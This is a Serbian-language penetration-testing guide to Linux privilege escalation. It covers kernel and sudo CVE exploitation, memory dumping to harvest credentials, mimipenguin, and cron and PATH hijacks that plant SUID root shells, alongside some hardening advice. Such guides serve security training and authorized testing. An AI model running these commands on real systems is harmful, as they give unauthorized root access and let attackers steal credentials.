# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Za širi kontekst i istorijske postupke enumeracije pogledajte resurse g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation i linux-private navedene u referencama.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informacije o sistemu

### Informacije o OS-u

Počnimo sa prikupljanjem informacija o OS-u koji je pokrenut.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Putanja

Ako imate **dozvole za pisanje u bilo kojoj fascikli unutar promenljive `PATH`**, možda možete da preuzmete kontrolu nad nekim bibliotekama ili binarnim datotekama:

```bash
echo $PATH
```

### Informacije o okruženju

Zanimljive informacije, lozinke ili API ključevi u promenljivama okruženja?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Proverite verziju kernela i da li postoji exploit koji može da se iskoristi za eskalaciju privilegija.

U [odeljku Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) nalaze se slučajevi lokalne eskalacije i linkovi ka detaljnijim tekstovima o Linux kernelu u oblasti Binary Exploitation. Pre testiranja slučaja proverite da li su build i konfiguracija podložni napadu.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Možete pronaći dobar spisak ranjivih kernel verzija i neke već **kompajlirane exploit-e** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Ostali sajtovi na kojima možete pronaći **kompajlirane exploit-e**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izdvojili sve ranjive verzije kernela sa tog sajta, možete uraditi sledeće:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Alati koji mogu pomoći u pretrazi kernel exploit-a su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (pokrenite NA žrtvi, proverava samo exploit-e za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**. Možda je verzija vašeg kernela navedena u nekom kernel exploit-u, pa ćete biti sigurni da je taj exploit validan.

Dodatne tehnike za iskorišćavanje kernela:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacija privilegija u Linux-u - Linux kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo verzija

Na osnovu ranjivih verzija sudo-a koje se pojavljuju u:

```bash
searchsploit sudo
```

Možete proveriti da li je verzija sudo-a ranjiva pomoću ove grep komande.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 through 1.9.17** omogućava neprivilegovanim lokalnim korisnicima da eskaliraju privilegije do root-a putem opcije `--chroot` kada sudo učitava `/etc/nsswitch.conf` iz direktorijuma kojim upravlja korisnik; upstream je ovo ispravio u verziji **1.9.17p1**. Proverite svaku root-setuid sudo binarnu datoteku u relevantnim putanjama, jer `sudo -V` prikazuje samo binarnu datoteku izabranu preko `PATH`. Distribucioni paketi mogu da prenesu ispravku bez promene upstream oznake verzije, zato proverite i status paketa dobavljača. Pogledajte [savetodavno obaveštenje sudo održavaoca](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Evo [PoC-a](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) za iskorišćavanje te [ranjivosti](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita proverite da li je vaša verzija `sudo` ranjiva i da li podržava funkciju `chroot`.  

Za više informacija pogledajte originalno [savetodavno obaveštenje o ranjivosti](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Sudo zaobilaženje pravila zasnovanih na hostu (CVE-2025-32462)

Upstream sudo **1.8.8 through 1.9.17** može da procenjuje sudoers pravila zasnovana na hostu koristeći **ime hosta koje je zadao korisnik** preko `sudo -h <host>`, umesto **stvarnog imena hosta**; upstream je ovo ispravio u verziji **1.9.17p1**. Korisnik i dalje mora da ima odgovarajući sudoers unos za izabrani host. Proverite i ispravke dobavljača i alternativne sudo binarne datoteke, kao i lokalnu politiku. Pogledajte [savetodavno obaveštenje sudo održavaoca](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Zahtevi:
- Ranjiva verzija sudo
- Sudoers pravila specifična za host (host nije ni trenutno ime hosta ni `ALL`)

Primer sudoers obrasca:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Iskorišćavanje lažiranjem dozvoljenog hosta:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Ako razrešavanje izabranog imena ne uspe, proverite kako se to ime razrešava na hostu. To što se ime pojavljuje u logu ili konfiguracionoj datoteci ne znači da može da se razreši, a za izmenu datoteke `/etc/hosts` obično su potrebna privilegovana prava upisa.

#### sudo < v1.8.28

Ovaj [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) zahteva efektivno sudo pravilo koje dozvoljava izvršavanje komande kao bilo koji korisnik osim root-a, kao što je `(ALL, !root) /bin/bash`. Pozivalac takođe mora da ima dozvolu da koristi to pravilo, uključujući sve zahteve za autentifikaciju. Proverite bezbednosno obaveštenje za instalirani paket: dobavljači su backportovali ispravku u izdanja čija je prikazana upstream verzija i dalje niža od 1.8.28. Samo pravilo `!root` ili stara verzija ne potvrđuju ranjivost. Tokom pasivnog prikupljanja podataka nemojte testirati privilegovanu komandu.

```
sudo -u#-1 /bin/bash
```

### Dmesg provera potpisa nije uspela

Pogledajte **HTB box smasher2** za **primer** kako bi ova ranjivost mogla da se iskoristi.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Još enumeracije sistema

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Nabrojte moguće odbrane

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Izlazak iz kontejnera

Ako ste unutar kontejnera, počnite od sledećeg odeljka o bezbednosti kontejnera, a zatim pređite na stranice o zloupotrebama specifičnim za runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Diskovi

Proverite **šta je montirano i demontirano**, gde i zašto. Ako je nešto demontirano, možete pokušati da ga montirate i potražite privatne informacije.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Korisni alati

Izlistajte korisne binarne fajlove

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Takođe, proverite da li je **instaliran neki kompajler**. Ovo je korisno ako treba da upotrebite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na sličnoj mašini).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Instaliran ranjiv softver

Proverite **verzije instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagiosa (na primer) koja se može iskoristiti za eskalaciju privilegija…\
Preporučuje se da ručno proverite verzije sumnjivijeg instaliranog softvera.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Ako imate SSH pristup mašini, možete da koristite i **openVAS** da proverite da li su na njoj instalirani zastareli i ranjivi softveri.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će uglavnom biti beskorisne, zato se preporučuje korišćenje aplikacija kao što je OpenVAS ili sličnih, koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploite_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **veće privilegije nego što bi trebalo** (možda se tomcat izvršava kao root?)

```bash
ps aux
ps -ef
top -n 1
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md); možete ih zloupotrebiti za eskalaciju privilegija. **Linpeas** ih otkriva proverom parametra `--inspect` u komandnoj liniji procesa.\
Takođe **proverite svoja ovlašćenja nad binarnim datotekama procesa**; možda možete da prepišete nečiju datoteku.

### Lanci roditeljskih i podređenih procesa između različitih korisnika

Podređeni proces koji se izvršava pod **drugim korisnikom** od svog roditeljskog procesa nije automatski zlonameran, ali predstavlja koristan **triage signal**. Neki prelazi su očekivani (`root` pokreće servisnog korisnika, upravljači prijavom kreiraju procese sesije), ali neuobičajeni lanci mogu otkriti omotače, pomoćne alate za debagovanje, perzistenciju ili slabe granice poverenja u runtime-u.

Brza provera:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Ako pronađeš neočekivan lanac, proveri komandnu liniju roditeljskog procesa i sve datoteke koje utiču na njegovo ponašanje (`config`, `EnvironmentFile`, pomoćne skripte, radni direktorijum, argumente u koje može da se upisuje). U nekoliko stvarnih privesc slučajeva, sam child proces nije mogao da se menja, ali mogao je config kojim upravlja parent proces ili lanac pomoćnih skripti.

### Izbrisani executables i otvorene datoteke koje su izbrisane

Runtime artifacts su često i dalje dostupni **nakon brisanja**. Ovo je korisno i za eskalaciju privilegija i za pribavljanje dokaza iz procesa koji već ima otvorene osetljive datoteke.

Proveri da li postoje izbrisani executables:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Ako `/proc/<PID>/exe` pokazuje na `(deleted)`, proces i dalje pokreće staru binarnu sliku iz memorije. To je snažan signal za dalje istraživanje, jer:

- uklonjiva izvršna datoteka može sadržati zanimljive stringove ili akreditive
- pokrenuti proces možda i dalje izlaže korisne deskriptore datoteka
- obrisana privilegovana binarna datoteka može ukazivati na nedavno neovlašćeno menjanje ili pokušaj uklanjanja tragova

Prikupite globalno obrisane otvorene datoteke:

```bash
lsof +L1
```

Ako pronađeš zanimljiv deskriptor, preuzmi ga direktno:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Ovo je posebno korisno kada proces i dalje ima otvorenu obrisanu tajnu, skriptu, izvoz baze podataka ili flag datoteku.

### Nadzor procesa

Za nadzor procesa možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy). Ovo može biti veoma korisno za prepoznavanje ranjivih procesa koji se često pokreću ili se pokreću kada se ispuni određeni skup uslova.

#### Linux ProcMon uz sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) može da prati izabrane procese i sistemske pozive i da sačuva SQLite trag. Ako `sudo -l` dozvoljava neograničeno pokretanje komande `procmon` sa root privilegijama, razmotrite da li bi ona mogla da nadzire ulaz ili izlaz procesa drugog korisnika. Ova dozvola je samo smernica za proveru: važni su podrška za tracer, efektivna politika i aktivnost odgovarajućeg procesa. Datoteke sa tragovima mogu da sadrže tajne, zato pažljivo pregledajte ovlašćene izvoze i izbegavajte prikupljanje podataka o nepovezanim procesima.

### Memorija procesa

Neke serverske usluge čuvaju **kredencijale u čistom tekstu u memoriji**.\
Obično će vam biti potrebne **root privilegije** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, pa je ovo uglavnom korisnije kada već imate root pristup i želite da pronađete dodatne kredencijale.\
Međutim, imajte na umu da **kao običan korisnik možete čitati memoriju procesa koji su u vašem vlasništvu**.

> [!WARNING]
> Imajte na umu da danas većina računara **podrazumevano ne dozvoljava ptrace**, što znači da ne možete da izbacite memoriju drugih procesa koji pripadaju vašem neprivilegovanom korisniku.
>
> Datoteka _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše dostupnost ptrace-a:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu da se debaguju, pod uslovom da imaju isti uid. Ovo je klasičan način na koji je ptrace radio.
> - **kernel.yama.ptrace_scope = 1**: može da se debaguje samo roditeljski proces.
> - **kernel.yama.ptrace_scope = 2**: samo administrator može da koristi ptrace, jer je za to potrebna mogućnost CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces ne može da se prati pomoću ptrace-a. Kada se ova vrednost postavi, potrebno je ponovo pokrenuti sistem da bi se ptrace ponovo omogućio.

Proces sa istim UID-om koji nakratko otključa password vault može predstavljati zasebnu granicu zaštite kredencijala. Kada je praćenje dozvoljeno, aktivan proces čiji se sadržaj može izbaciti iz memorije može izložiti lozinku vault-a kroz ulazne sistemske pozive ili memoriju, čak i kada je sama šifrovana datoteka vault-a i dalje zaštićena. `ptrace_scope=0` je samo jedan od preduslova: važni su i podudarni kredencijali, mogućnost izbacivanja sadržaja ciljnog procesa iz memorije, drugi Linux bezbednosni moduli i trajanje procesa. Da bi unos iz vault-a postao Unix root prijava, potrebno je zasebno proveriti ponovnu upotrebu kredencijala. Rutinsko prikupljanje podataka treba da navede politiku i potencijalni proces ili putanje do vault-a, a ne da hvata ulaz ili ispisuje tajne. Pogledajte [Yama dokumentaciju kernela](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) i [provere ptrace pristupa](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Ako imate pristup memoriji FTP usluge (na primer), možete da preuzmete Heap i u njemu potražite kredencijale.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB skripta

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuje kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; prikazuje i **dozvole za svaki mapirani region**. Pseudo-datoteka **mem** **izlaže samu memoriju procesa**. Iz datoteke **maps** saznajemo koji su **memorijski regioni čitljivi** i koji su njihovi pomaci. Ove informacije koristimo da **premotamo datoteku mem do željenih pozicija i izvezemo sve čitljive regione** u datoteku.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` omogućava pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelnom adresnom prostoru kernela može se pristupiti pomoću /dev/kmem.\
Obično, `/dev/mem` mogu da čitaju samo **root** i grupa **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump za Linux

ProcDump je Linux verzija klasičnog alata ProcDump iz paketa Sysinternals za Windows. Preuzmite ga sa [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Alatke

Za izbacivanje memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahtev za root privilegijama i izbaciti proces čiji ste vlasnik
- Skripta A.5 sa [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako utvrdite da je authenticator process pokrenut:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Možete da izbacite sadržaj procesa (pogledajte prethodne odeljke za različite načine izbacivanja memorije procesa) i da potražite akreditive u memoriji:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti akreditive u čistom tekstu iz memorije** i iz nekih **poznatih datoteka**. Za pravilan rad potrebne su mu root privilegije.

| Funkcija                                          | Naziv procesa       |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP veze)                         | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)          | apache2              |
| OpenSSH (aktivne SSH sesije — korišćenje sudo-a)  | sshd:                |

#### Regex pretrage/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zakazani/Cron poslovi

### Crontab UI (alseambusher) radi kao root – privesc preko web-baziranog scheduler-a

Ako web „Crontab UI“ panel (alseambusher/crontab-ui) radi kao root i vezan je samo za loopback, i dalje mu možete pristupiti preko SSH prosleđivanja lokalnog porta i napraviti privilegovani posao radi eskalacije.<sup>[[1]](#references)[[4]](#references)</sup>

Uobičajeni niz koraka
- Otkrijte port dostupan samo preko loopback-a (npr. 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađite akreditive u operativnim artefaktima:
  - Rezervne kopije/skripte sa `zip -P <password>`
  - systemd jedinica koja otkriva `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Napravite tunel i prijavite se:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreirajte zadatak sa visokim privilegijama i odmah ga pokrenite (kreira SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristite ga:
```bash
/tmp/rootshell -p   # root shell
```

Ojačavanje bezbednosti
- Nemoj pokretati Crontab UI kao root; ograniči ga namenskim korisnikom i minimalnim dozvolama
- Veži ga za localhost i dodatno ograniči pristup firewall-om/VPN-om; nemoj ponovo koristiti lozinke
- Izbegavaj ugrađivanje tajni u unit datoteke; koristi skladišta tajni ili EnvironmentFile dostupan samo root-u
- Omogući audit/logovanje izvršavanja poslova na zahtev

Proveri da li je neki zakazani posao ranjiv. Možda možeš da iskoristiš skriptu koju izvršava root (wildcard ranjivost? Možeš li da izmeniš datoteke koje koristi root? Da upotrebiš simboličke linkove? Da napraviš određene datoteke u direktorijumu koji koristi root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Ako se koristi `run-parts`, proverite koja će se imena zaista izvršiti:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Ovim se izbegavaju lažno pozitivni rezultati. Direktorijum sa periodičnim zadacima u koji može da se upisuje koristan je samo ako se naziv datoteke vašeg payload-a podudara sa lokalnim pravilima za `run-parts`.

### Cron putanja

Na primer, u _/etc/crontab_ možete pronaći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Imajte na umu da korisnik „user“ ima dozvole za pisanje u direktorijum /home/user_)

Ako root korisnik u ovom crontab-u pokuša da izvrši neku komandu ili skriptu bez zadavanja putanje, na primer: _\* \* \* \* root overwrite.sh_\
onda možete dobiti root shell pomoću:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron koji koristi skriptu sa džoker znakom (Wildcard Injection)

Ako se skripta izvršava kao root i unutar komande sadrži „**\***“, možete to da iskoristite da izazovete neočekivane stvari (kao što je privesc). Primer:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Ako ispred wildcard-a stoji putanja kao što je** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za još trikova za iskorišćavanje wildcard-a:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injekcija u Bash aritmetičkom proširenju u cron parserima logova

Bash aritmetika može da protumači nepouzdan tekst kao izraz. U određenim Bash kontekstima, indeks niza unutar tog izraza može da izvrši zamenu komandom. Ako privilegovani cron/parser ubaci tekst iz loga kojim upravlja napadač u takvo aritmetičko poređenje, zamena može da se izvrši uz privilegije parsera.<sup>[[22]](#references)</sup> Ovo zavisi od tačnog Bash izraza i verzije; samostalni niz `$(...)0` u proširenoj promenljivoj nije pouzdan dokaz da će se izraz ponovo obraditi.

Ulaz može poticati i iz metapodataka datoteke ili drugog polja pročitanog sa lokacije u koju korisnik može da upisuje. Na primer, privilegovana skripta za čišćenje koja čita oznaku `Producer` sa slike i poredi je pomoću `[[ "$producer" -eq "expected" ]]` vrši aritmetičko poređenje, iako je promenljiva stavljena pod navodnike. Utvrdite koji identitet se koristi za zakazani zadatak, koje datoteke mogu da obezbede oznaku, koje se transformacije obavljaju pre poređenja i kako se tačno ponaša Bash. Za tekstualne oznake koristite poređenje nizova; za brojeve proverite da li se ulaz sastoji samo od decimalnih cifara pre aritmetičke obrade. Pogledajte [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Uobičajen ranjiv obrazac:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Безбедна локална провера понашања механизма индексирања низа (без привилегованог процеса или измене датотеке):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Pratite stvarnu zakazanu skriptu i doslovnu putanju ulaza koju otvara. Čak i kada log datoteka sama nije upisiva, korisnik koji može da piše u njen nadređeni direktorijum koji nije sticky i da mu pristupi može da zameni njen unos u direktorijumu; `namei -l` pomaže da se razlikuju te dozvole. Druga upisiva putanja loga, nečitljiv scheduler ili parser koji nikada ne evaluira to polje kao Bash aritmetiku ne potvrđuju ovu putanju.

### Prepisivanje cron skripte i symlink

Ako **možete da izmenite cron skriptu** koju izvršava root, veoma lako možete da dobijete shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Ako skripta koju izvršava root koristi **direktorijum kojem imate pun pristup**, možda bi bilo korisno da obrišete taj direktorijum i **napravite symlink direktorijum ka drugom direktorijumu** koji sadrži skriptu pod vašom kontrolom.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Provera symlinkova i bezbednije rukovanje datotekama

Prilikom pregleda privilegovanih skripti/binarnih datoteka koje čitaju ili upisuju datoteke prema putanji, proverite kako se obrađuju linkovi:

- `stat()` prati symlink i vraća metapodatke cilja.
- `lstat()` vraća metapodatke samog linka.
- `readlink -f` i `namei -l` pomažu da se razreši konačni cilj i prikažu dozvole za svaku komponentu putanje.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Za defanzivce/programere, bezbedniji obrasci protiv trikova sa symlinkovima uključuju:

- `O_EXCL` sa `O_CREAT`: ne uspeva ako putanja već postoji (blokira linkove/datoteke koje je napadač unapred kreirao).
- `openat()`: radi u odnosu na pouzdani deskriptor datoteke direktorijuma.
- `mkstemp()`: atomski kreira privremene datoteke sa bezbednim dozvolama.

### Prilagođeni, potpisani cron binarni fajlovi sa sadržajem koji može da se menja
Običan korisnik koji može da menja tačan binarni fajl koji pokreće root cron posao može da pređe granicu privilegija, ali provera prilagođenog potpisa može da odbaci nepotpisanu zamenu. U dokumentovanom slučaju, ELF u vlasništvu root-a imao je režim `0760`, što je omogućavalo članu njegove grupe da ga menja, dok je vlasnik root mogao da ga izvršava. Vidljivi trag procesa pokazao je da je `objcopy` izdvajao `.text_sig` pre nego što je posao pokrenuo binarni fajl; cela skripta za proveru nije bila čitljiva.<sup>[[2]](#references)</sup>

Zamena koja je uspela bila je potpisana procurenim privatnim materijalom za potpisivanje pomoću ELF signer-a. Njegova [dokumentacija formata](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) opisuje odeljak potpisa izveden iz `.text` izvršne datoteke. Nije pokazano da samo dodavanje sertifikata ili odgovarajućeg niza u `.text_sig` zadovoljava nevidljivu proveru. Pre nego što zaključite da je binarni fajl koji može da se menja ranjiv na eksploataciju, proverite stvarnu zakazanu putanju, efektivna prava za izmenu, root pokretanje i pravila verifikacije. Odeljak `.text_sig` sam po sebi samo je naznaka za proveru.

### Česti cron poslovi

Možete pratiti procese da biste pronašli procese koji se izvršavaju na svakih 1, 2 ili 5 minuta. Možda možete to da iskoristite za eskalaciju privilegija.

Na primer, da biste **pratili svakih 0.1s tokom 1 minuta**, **sortirali po najmanje izvršavanim komandama** i obrisali komande koje su najčešće izvršavane, možete da uradite sledeće:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Možete koristiti i** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (nadgleda i izlistava svaki pokrenuti proces).

### Root rezervne kopije koje čuvaju mode bitove koje je postavio napadač (pg_basebackup)

